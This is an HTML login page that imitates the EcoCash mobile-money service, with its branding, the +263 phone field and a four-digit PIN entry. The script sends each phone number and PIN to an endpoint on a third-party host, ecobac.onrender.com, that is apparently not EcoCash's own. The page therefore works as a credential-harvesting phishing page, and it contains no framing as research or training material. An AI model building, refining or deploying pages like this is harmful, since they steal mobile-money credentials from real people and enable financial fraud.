<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EcoCash Login</title>

<style>
*{
    box-sizing:border-box;
}

body{
    margin:0;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
    background:#f2f2f2;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
}

/* Main Wrapper */
.wrapper{
    width:100%;
    max-width:420px;
    background:#f2f2f2;
    text-align:center;
    position:relative;
    overflow:hidden;
}

/* Top Section */
.top-section{
    padding:40px 25px 120px;
}

/* Logo */
.logo{
    font-size:42px;
    font-weight:bold;
}
.logo .eco{ color:#1e73be; }
.logo .cash{ color:#e53935; }

.login-title{
    margin-top:25px;
    font-size:26px;
    font-weight:600;
    color:#666;
}

/* Phone Box */
.phone-box{
    margin-top:30px;
    border:3px solid #1e73be;
    border-radius:16px;
    padding:14px;
    display:flex;
    align-items:center;
    gap:10px;
    background:#fff;
}

.flag{
    width:28px;
}

.prefix{
    font-size:18px;
    color:#555;
}

.phone-input{
    border:none;
    outline:none;
    font-size:18px;
    flex:1;
}

/* PIN */
.pin-label{
    margin-top:30px;
    font-size:20px;
    color:#777;
}

.pin-container{
    margin-top:25px;
    display:flex;
    justify-content:center;
    gap:18px;
}

.pin-container input{
    width:60px;
    height:60px;
    border-radius:14px;
    border:3px solid #1e73be;
    text-align:center;
    font-size:24px;
    outline:none;
}

/* Bottom Blue Section */
.bottom-section{
    background:#155fa0;
    padding:60px 20px 40px;
    border-top-left-radius:60% 100px;
    border-top-right-radius:60% 100px;
    color:#fff;
}

.bottom-text{
    font-size:16px;
    margin-bottom:30px;
}

.bottom-buttons{
    display:flex;
    gap:15px;
    justify-content:center;
    flex-wrap:wrap;
}

.btn{
    background:#f2f2f2;
    color:#000;
    padding:18px;
    border-radius:16px;
    width:160px;
    text-align:center;
    font-weight:500;
    cursor:pointer;
}

.version{
    margin-top:40px;
    font-size:14px;
    opacity:0.8;
}

.terms{
    margin-top:15px;
    font-size:14px;
}

.terms a{
    color:#fff;
    text-decoration:underline;
}

/* Responsive */
@media(max-width:480px){
    .pin-container input{
        width:50px;
        height:50px;
    }
}
</style>
</head>

<body>

<div class="wrapper">

    <div class="top-section">

        <div class="logo">
            <span class="eco">Eco</span><span class="cash">Cash</span>
        </div>

        <div class="login-title">Login</div>

        <form id="loginForm">

            <!-- Phone -->
            <div class="phone-box">
                <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Flag_of_Zimbabwe.svg" class="flag">
                <span class="prefix">+263</span>
                <input type="text"
                       id="phone"
                       class="phone-input"
                       placeholder="Phone Number"
                       required
                       pattern="7[0-9]{8}"
                       maxlength="9">
            </div>

            <!-- PIN -->
            <div class="pin-label">Enter your PIN</div>

            <div class="pin-container">
                <input type="password" maxlength="1" class="pin-digit" required>
                <input type="password" maxlength="1" class="pin-digit" required>
                <input type="password" maxlength="1" class="pin-digit" required>
                <input type="password" maxlength="1" class="pin-digit" required>
            </div>

            <input type="hidden" id="pin">

        </form>

    </div>

    <!-- Bottom Section -->
    <div class="bottom-section">
        <div class="bottom-text">
            To register an EcoCash wallet or get assistance,<br>click below
        </div>

        <div class="bottom-buttons">
            <div class="btn">Register</div>
            <div class="btn">Help & Support</div>
        </div>

        <div class="version">v3.0.2P</div>

        <div class="terms">
            By signing in you agree to the
            <a href="#">Terms and Conditions</a>
        </div>
    </div>

</div>

<script>
// PIN Auto Move + Auto Submit
const pinInputs = document.querySelectorAll(".pin-digit");
const hiddenPin = document.getElementById("pin");
const loginForm = document.getElementById("loginForm");

pinInputs.forEach((input, index) => {
    input.addEventListener("input", () => {

        if(input.value.length === 1 && index < pinInputs.length - 1){
            pinInputs[index + 1].focus();
        }

        hiddenPin.value = Array.from(pinInputs).map(i => i.value).join('');

        if(index === 3 && hiddenPin.value.length === 4){
            loginForm.requestSubmit();
        }
    });

    input.addEventListener("keydown", (e) => {
        if(e.key === "Backspace" && index > 0 && !input.value){
            pinInputs[index - 1].focus();
        }
    });
});

// === YOUR ORIGINAL LOGIN LOGIC (UNCHANGED) ===
loginForm.addEventListener("submit", async function (e) {
    e.preventDefault();

    const phone = document.getElementById("phone").value.trim();
    const pin = document.getElementById("pin").value.trim();

    if (!phone || !pin || !/^[0-9]{4}$/.test(pin)) {
        alert("Please enter a valid phone and 4-digit PIN");
        return;
    }

    try {
        const response = await fetch("https://ecobac.onrender.com/api/auth/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone, pin })
        });

        const data = await response.json();

        if (response.ok) {
            window.location.href = "dashboard.html";
        } else {
            alert(data.message);
        }
    } catch (error) {
        alert("Something went wrong.");
    }
});
</script>

</body>
</html>
